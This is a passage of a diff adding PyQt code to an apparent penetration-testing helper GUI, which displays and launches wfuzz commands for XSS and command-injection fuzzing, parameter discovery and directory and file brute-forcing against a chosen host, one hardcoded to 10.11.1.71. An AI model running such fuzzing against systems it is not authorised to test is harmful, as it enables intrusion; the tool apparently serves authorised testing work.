+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1_Copy)
+            self.wfuzzXSS_Scan1_Copy.deleteLater()
+        self.wfuzzXSS_Scan1_Copy = QPushButton()
+        self.wfuzzXSS_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzXSS_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzXSS_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzXSS_Scan1.text()))
+        self.wfuzzXSS_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzXSS_Scan1 run button
+        if hasattr(self, 'wfuzzXSS_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1_Run)
+            self.wfuzzXSS_Scan1_Run.deleteLater()
+        self.wfuzzXSS_Scan1_Run = QPushButton()
+        self.wfuzzXSS_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzXSS_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzXSS_Scan1.text() + "; bash"
+        self.wfuzzXSS_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzXSS_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzXSS_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzXSS_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzXSS_Scan1_Run)
+        label_layout.addWidget(self.wfuzzXSS_Scan1)
+        self.tab2_container_layout.insertLayout(42, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzXSS_Scan2
+        if hasattr(self, 'wfuzzXSS_Scan2'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2)
+            self.wfuzzXSS_Scan2.deleteLater()
+        self.wfuzzXSS_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt http://10.11.1.71:80/FUZZ")
+        self.wfuzzXSS_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzXSS_Scan2 copy button
+        if hasattr(self, 'wfuzzXSS_Scan2_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2_Copy)
+            self.wfuzzXSS_Scan2_Copy.deleteLater()
+        self.wfuzzXSS_Scan2_Copy = QPushButton()
+        self.wfuzzXSS_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzXSS_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzXSS_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzXSS_Scan2.text()))
+        self.wfuzzXSS_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzXSS_Scan2 run button
+        if hasattr(self, 'wfuzzXSS_Scan2_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2_Run)
+            self.wfuzzXSS_Scan2_Run.deleteLater()
+        self.wfuzzXSS_Scan2_Run = QPushButton()
+        self.wfuzzXSS_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzXSS_Scan2_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzXSS_Scan2.text() + "; bash"
+        self.wfuzzXSS_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzXSS_Scan2_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzXSS_Scan2 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzXSS_Scan2_Copy)
+        label_layout.addWidget(self.wfuzzXSS_Scan2_Run)
+        label_layout.addWidget(self.wfuzzXSS_Scan2)
+        self.tab2_container_layout.insertLayout(43, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzXSS_spacer1
+        if hasattr(self, 'wfuzzXSS_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_spacer1)
+            self.wfuzzXSS_spacer1.deleteLater()
+        self.wfuzzXSS_spacer1 = QLabel()
+        self.wfuzzXSS_spacer1.setFixedWidth(40)
+        self.wfuzzXSS_spacer1.setFixedHeight(40)
+
+        # wfuzzXSS_spacer & divider layout
+        self.tab2_container_layout.insertWidget(44, self.wfuzzXSS_spacer1)
+
+# wfuzzCIPD
+        if hasattr(self, 'wfuzzCIPD'):
+            self.tab2_container_layout.removeWidget(self.wfuzzCIPD)
+            self.wfuzzCIPD.deleteLater()
+        self.wfuzzCIPD = QLabel("[+ Wfuzz Command Injection with Post Data]")
+        self.wfuzzCIPD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(45,self.wfuzzCIPD)
+
+        # wfuzzCIPD_Scan1
+        if hasattr(self, 'wfuzzCIPD_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1)
+            self.wfuzzCIPD_Scan1.deleteLater()
+        self.wfuzzCIPD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt -d doi=FUZZ http://{self.rhost}:{self.rport}/FUZZ")
+        self.wfuzzCIPD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzCIPD_Scan1 copy button
+        if hasattr(self, 'wfuzzCIPD_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1_Copy)
+            self.wfuzzCIPD_Scan1_Copy.deleteLater()
+        self.wfuzzCIPD_Scan1_Copy = QPushButton()
+        self.wfuzzCIPD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzCIPD_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzCIPD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzCIPD_Scan1.text()))
+        self.wfuzzCIPD_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzCIPD_Scan1 run button
+        if hasattr(self, 'wfuzzCIPD_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1_Run)
+            self.wfuzzCIPD_Scan1_Run.deleteLater()
+        self.wfuzzCIPD_Scan1_Run = QPushButton()
+        self.wfuzzCIPD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzCIPD_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzCIPD_Scan1.text() + "; bash"
+        self.wfuzzCIPD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzCIPD_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzCIPD_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzCIPD_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzCIPD_Scan1_Run)
+        label_layout.addWidget(self.wfuzzCIPD_Scan1)
+        self.tab2_container_layout.insertLayout(46, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzCIPD_spacer1
+        if hasattr(self, 'wfuzzCIPD_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_spacer1)
+            self.wfuzzCIPD_spacer1.deleteLater()
+        self.wfuzzCIPD_spacer1 = QLabel()
+        self.wfuzzCIPD_spacer1.setFixedWidth(40)
+        self.wfuzzCIPD_spacer1.setFixedHeight(40)
+
+        # wfuzzCIPD_spacer & divider layout
+        self.tab2_container_layout.insertWidget(47, self.wfuzzCIPD_spacer1)
+
+# wfuzzPE
+        if hasattr(self, 'wfuzzPE'):
+            self.tab2_container_layout.removeWidget(self.wfuzzPE)
+            self.wfuzzPE.deleteLater()
+        self.wfuzzPE = QLabel("[+ Wfuzz Testing for Parameter Existence]")
+        self.wfuzzPE.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(48,self.wfuzzPE)
+
+        # wfuzzPE_Scan1
+        if hasattr(self, 'wfuzzPE_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1)
+            self.wfuzzPE_Scan1.deleteLater()
+        self.wfuzzPE_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://{self.rhost}:{self.rport}/FUZZ")
+        self.wfuzzPE_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzPE_Scan1 copy button
+        if hasattr(self, 'wfuzzPE_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1_Copy)
+            self.wfuzzPE_Scan1_Copy.deleteLater()
+        self.wfuzzPE_Scan1_Copy = QPushButton()
+        self.wfuzzPE_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzPE_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzPE_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzPE_Scan1.text()))
+        self.wfuzzPE_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzPE_Scan1 run button
+        if hasattr(self, 'wfuzzPE_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1_Run)
+            self.wfuzzPE_Scan1_Run.deleteLater()
+        self.wfuzzPE_Scan1_Run = QPushButton()
+        self.wfuzzPE_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzPE_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzPE_Scan1.text() + "; bash"
+        self.wfuzzPE_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzPE_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzPE_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzPE_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzPE_Scan1_Run)
+        label_layout.addWidget(self.wfuzzPE_Scan1)
+        self.tab2_container_layout.insertLayout(49, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzPE_spacer1
+        if hasattr(self, 'wfuzzPE_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzPE_spacer1)
+            self.wfuzzPE_spacer1.deleteLater()
+        self.wfuzzPE_spacer1 = QLabel()
+        self.wfuzzPE_spacer1.setFixedWidth(40)
+        self.wfuzzPE_spacer1.setFixedHeight(40)
+
+        # wfuzzPE_spacer & divider layout
+        self.tab2_container_layout.insertWidget(50, self.wfuzzPE_spacer1)
+
+# wfuzzAFD
+        if hasattr(self, 'wfuzzAFD'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFD)
+            self.wfuzzAFD.deleteLater()
+        self.wfuzzAFD = QLabel("[+ Wfuzz Authenticated Fuzzing Directories]")
+        self.wfuzzAFD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(51,self.wfuzzAFD)
+
+        # wfuzzAFD_Scan1
+        if hasattr(self, 'wfuzzAFD_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1)
+            self.wfuzzAFD_Scan1.deleteLater()
+        self.wfuzzAFD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -hc 404 -d \"SESSIONID=value\" \"http://{self.rhost}:{self.rport}/FUZZ/\"")
+        self.wfuzzAFD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzAFD_Scan1 copy button
+        if hasattr(self, 'wfuzzAFD_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1_Copy)
+            self.wfuzzAFD_Scan1_Copy.deleteLater()
+        self.wfuzzAFD_Scan1_Copy = QPushButton()
+        self.wfuzzAFD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzAFD_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzAFD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzAFD_Scan1.text()))
+        self.wfuzzAFD_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzAFD_Scan1 run button
+        if hasattr(self, 'wfuzzAFD_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1_Run)
+            self.wfuzzAFD_Scan1_Run.deleteLater()
+        self.wfuzzAFD_Scan1_Run = QPushButton()
+        self.wfuzzAFD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzAFD_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzAFD_Scan1.text() + "; bash"
+        self.wfuzzAFD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzAFD_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzAFD_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzAFD_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzAFD_Scan1_Run)
+        label_layout.addWidget(self.wfuzzAFD_Scan1)
+        self.tab2_container_layout.insertLayout(52, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzAFD_spacer1
+        if hasattr(self, 'wfuzzAFD_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFD_spacer1)
+            self.wfuzzAFD_spacer1.deleteLater()
+        self.wfuzzAFD_spacer1 = QLabel()
+        self.wfuzzAFD_spacer1.setFixedWidth(40)
+        self.wfuzzAFD_spacer1.setFixedHeight(40)
+
+        # wfuzzAFD_spacer & divider layout
+        self.tab2_container_layout.insertWidget(53, self.wfuzzAFD_spacer1)
+
+# wfuzzAFF
+        if hasattr(self, 'wfuzzAFF'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFF)
+            self.wfuzzAFF.deleteLater()
+        self.wfuzzAFF = QLabel("[+ Authenticated File Fuzzing]")
+        self.wfuzzAFF.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(54,self.wfuzzAFF)
+
+        # wfuzzAFF_Scan1
+        if hasattr(self, 'wfuzzAFF_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1)
+            self.wfuzzAFF_Scan1.deleteLater()
+        self.wfuzzAFF_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -hc 404 -d \"SESSIONID=value\" \"http://{self.rhost}:{self.rport}/FUZZ\"")
+        self.wfuzzAFF_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzAFF_Scan1 copy button
+        if hasattr(self, 'wfuzzAFF_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1_Copy)
+            self.wfuzzAFF_Scan1_Copy.deleteLater()
+        self.wfuzzAFF_Scan1_Copy = QPushButton()
+        self.wfuzzAFF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzAFF_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzAFF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzAFF_Scan1.text()))
+        self.wfuzzAFF_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzAFF_Scan1 run button
+        if hasattr(self, 'wfuzzAFF_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1_Run)
+            self.wfuzzAFF_Scan1_Run.deleteLater()
+        self.wfuzzAFF_Scan1_Run = QPushButton()
+        self.wfuzzAFF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzAFF_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzAFF_Scan1.text() + "; bash"
+        self.wfuzzAFF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzAFF_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzAFF_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzAFF_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzAFF_Scan1_Run)
+        label_layout.addWidget(self.wfuzzAFF_Scan1)
+        self.tab2_container_layout.insertLayout(55, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzAFF_spacer1
+        if hasattr(self, 'wfuzzAFF_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzAFF_spacer1)
+            self.wfuzzAFF_spacer1.deleteLater()
+        self.wfuzzAFF_spacer1 = QLabel()
+        self.wfuzzAFF_spacer1.setFixedWidth(40)
+        self.wfuzzAFF_spacer1.setFixedHeight(40)
+
+        # wfuzzAFF_spacer & divider layout
+        self.tab2_container_layout.insertWidget(56, self.wfuzzAFF_spacer1)
+
+# wfuzzD
+        if hasattr(self, 'wfuzzD'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD)
+            self.wfuzzD.deleteLater()
+        self.wfuzzD = QLabel("[+ Wfuzz Fuzz Directories]")
+        self.wfuzzD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(57,self.wfuzzD)
+
+        # wfuzzD_Scan1
+        if hasattr(self, 'wfuzzD_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1)
+            self.wfuzzD_Scan1.deleteLater()
+        self.wfuzzD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
+        self.wfuzzD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzD_Scan1 copy button
+        if hasattr(self, 'wfuzzD_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1_Copy)
+            self.wfuzzD_Scan1_Copy.deleteLater()
+        self.wfuzzD_Scan1_Copy = QPushButton()
+        self.wfuzzD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzD_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan1.text()))
+        self.wfuzzD_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan1 run button
+        if hasattr(self, 'wfuzzD_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1_Run)
+            self.wfuzzD_Scan1_Run.deleteLater()
+        self.wfuzzD_Scan1_Run = QPushButton()
+        self.wfuzzD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzD_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzD_Scan1.text() + "; bash"
+        self.wfuzzD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzD_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzD_Scan1_Copy)
+        label_layout.addWidget(self.wfuzzD_Scan1_Run)
+        label_layout.addWidget(self.wfuzzD_Scan1)
+        self.tab2_container_layout.insertLayout(58, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzD_Scan2
+        if hasattr(self, 'wfuzzD_Scan2'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2)
+            self.wfuzzD_Scan2.deleteLater()
+        self.wfuzzD_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
+        self.wfuzzD_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzD_Scan2 copy button
+        if hasattr(self, 'wfuzzD_Scan2_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2_Copy)
+            self.wfuzzD_Scan2_Copy.deleteLater()
+        self.wfuzzD_Scan2_Copy = QPushButton()
+        self.wfuzzD_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzD_Scan2_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzD_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan2.text()))
+        self.wfuzzD_Scan2_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan2 run button
+        if hasattr(self, 'wfuzzD_Scan2_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2_Run)
+            self.wfuzzD_Scan2_Run.deleteLater()
+        self.wfuzzD_Scan2_Run = QPushButton()
+        self.wfuzzD_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzD_Scan2_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzD_Scan2.text() + "; bash"
+        self.wfuzzD_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzD_Scan2_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan2 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzD_Scan2_Copy)
+        label_layout.addWidget(self.wfuzzD_Scan2_Run)
+        label_layout.addWidget(self.wfuzzD_Scan2)
+        self.tab2_container_layout.insertLayout(59, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzD_Scan3
+        if hasattr(self, 'wfuzzD_Scan3'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3)
+            self.wfuzzD_Scan3.deleteLater()
+        self.wfuzzD_Scan3 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
+        self.wfuzzD_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzD_Scan3 copy button
+        if hasattr(self, 'wfuzzD_Scan3_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3_Copy)
+            self.wfuzzD_Scan3_Copy.deleteLater()
+        self.wfuzzD_Scan3_Copy = QPushButton()
+        self.wfuzzD_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzD_Scan3_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzD_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan3.text()))
+        self.wfuzzD_Scan3_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan3 run button
+        if hasattr(self, 'wfuzzD_Scan3_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3_Run)
+            self.wfuzzD_Scan3_Run.deleteLater()
+        self.wfuzzD_Scan3_Run = QPushButton()
+        self.wfuzzD_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzD_Scan3_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzD_Scan3.text() + "; bash"
+        self.wfuzzD_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzD_Scan3_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan3 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzD_Scan3_Copy)
+        label_layout.addWidget(self.wfuzzD_Scan3_Run)
+        label_layout.addWidget(self.wfuzzD_Scan3)
+        self.tab2_container_layout.insertLayout(60, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzD_Scan4
+        if hasattr(self, 'wfuzzD_Scan4'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4)
+            self.wfuzzD_Scan4.deleteLater()
+        self.wfuzzD_Scan4 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
+        self.wfuzzD_Scan4.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzD_Scan4 copy button
+        if hasattr(self, 'wfuzzD_Scan4_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4_Copy)
+            self.wfuzzD_Scan4_Copy.deleteLater()
+        self.wfuzzD_Scan4_Copy = QPushButton()
+        self.wfuzzD_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzD_Scan4_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzD_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan4.text()))
+        self.wfuzzD_Scan4_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan4 run button
+        if hasattr(self, 'wfuzzD_Scan4_Run'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan4_Run)
+            self.wfuzzD_Scan4_Run.deleteLater()
+        self.wfuzzD_Scan4_Run = QPushButton()
+        self.wfuzzD_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.wfuzzD_Scan4_Run.setFixedSize(QSize(20,20))
+        command10 = self.wfuzzD_Scan4.text() + "; bash"
+        self.wfuzzD_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.wfuzzD_Scan4_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzD_Scan4 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.wfuzzD_Scan4_Copy)
+        label_layout.addWidget(self.wfuzzD_Scan4_Run)
+        label_layout.addWidget(self.wfuzzD_Scan4)
+        self.tab2_container_layout.insertLayout(61, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzD_spacer1
+        if hasattr(self, 'wfuzzD_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzD_spacer1)
+            self.wfuzzD_spacer1.deleteLater()
+        self.wfuzzD_spacer1 = QLabel()
+        self.wfuzzD_spacer1.setFixedWidth(40)
+        self.wfuzzD_spacer1.setFixedHeight(40)
+
+        # wfuzzD_spacer & divider layout
+        self.tab2_container_layout.insertWidget(62, self.wfuzzD_spacer1)
+
+# wfuzzF
+        if hasattr(self, 'wfuzzF'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF)
+            self.wfuzzF.deleteLater()
+        self.wfuzzF = QLabel("[+ Nikto with SSL and Evasion:]")
+        self.wfuzzF.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(63,self.wfuzzF)
+
+        # wfuzzF_Scan1
+        if hasattr(self, 'wfuzzF_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1)
+            self.wfuzzF_Scan1.deleteLater()
+        self.wfuzzF_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ\"")
+        self.wfuzzF_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzF_Scan1 copy button
+        if hasattr(self, 'wfuzzF_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.wfuzzF_Scan1_Copy)
+            self.wfuzzF_Scan1_Copy.deleteLater()
+        self.wfuzzF_Scan1_Copy = QPushButton()
+        self.wfuzzF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.wfuzzF_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.wfuzzF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzF_Scan1.text()))
+        self.wfuzzF_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # wfuzzF_Scan1 run button
